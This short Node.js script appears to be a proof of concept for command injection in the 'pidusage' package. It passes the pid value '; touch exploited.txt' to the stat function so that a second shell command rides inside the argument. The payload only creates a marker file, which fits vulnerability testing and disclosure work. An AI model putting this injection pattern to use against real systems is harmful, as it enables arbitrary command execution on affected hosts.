const pkg = require('pidusage');

const pid = "; touch exploited.txt";

const cb = function(error, data) {

};

console.log(pkg);


pkg.stat(pid, cb);